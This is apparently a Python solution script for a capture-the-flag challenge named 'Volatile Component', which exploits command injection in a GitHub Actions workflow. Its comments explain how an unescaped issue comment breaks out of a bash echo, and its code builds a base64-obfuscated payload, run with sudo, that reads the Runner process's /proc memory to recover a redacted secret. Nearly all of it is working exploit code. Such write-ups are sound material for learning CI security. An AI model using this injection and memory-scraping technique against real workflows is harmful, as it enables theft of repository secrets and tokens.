#!/usr/bin/env python3

import base64

# The challenge is a GitHub Actions command injection.
# 
# Flaw 1 (Command Injection):
# In step 3, the workflow runs:
#   echo "Processing comment: ${{ github.event.comment.body || github.event.issue.body }}"
# Because the event body is directly interpolated into the bash script without escaping,
# we can break out of the echo command. A comment starting with `"; <command>; echo "`
# will execute arbitrary code.
#
# Flaw 2 (Data Retention in Memory):
# Step 2 attempts to rigorously search the filesystem for the flag and redact it using `sed -i`.
# Because our payload in step 3 runs *after* step 2, the flag has already been erased from disk.
# However, the challenge is named "Volatile Component". Volatile memory (RAM) is not cleared!
# The GitHub Actions Runner (`Runner.Worker`) process evaluated the secret and still holds the 
# unredacted flag in its heap memory.
# 
# Solution:
# We inject a small Python script that iterates through the memory maps of the `Runner` process,
# reads `/proc/<pid>/mem`, and dumps the unredacted flag.

mem_dump_script = b"""import os,re
for p in os.listdir('/proc'):
 if p.isdigit():
  try:
   if 'Runner' in open(f'/proc/{p}/cmdline').read():
    m=open(f'/proc/{p}/mem','rb')
    for l in open(f'/proc/{p}/maps'):
     if 'rw' in l:
      s,e=[int(x,16) for x in l.split()[0].split('-')]
      m.seek(s)
      try:
       for match in re.findall(br'GPNCTF\\{[^}]+\\}', m.read(e-s)):
        if b'REDACTED' not in match: print(' '.join(chr(c) for c in match))
      except: pass
  except: pass"""

encoded_script = base64.b64encode(mem_dump_script).decode()

payload = f'"; sudo python3 -c "import base64;exec(base64.b64decode(\'{encoded_script}\'))"; echo "'

print(payload)
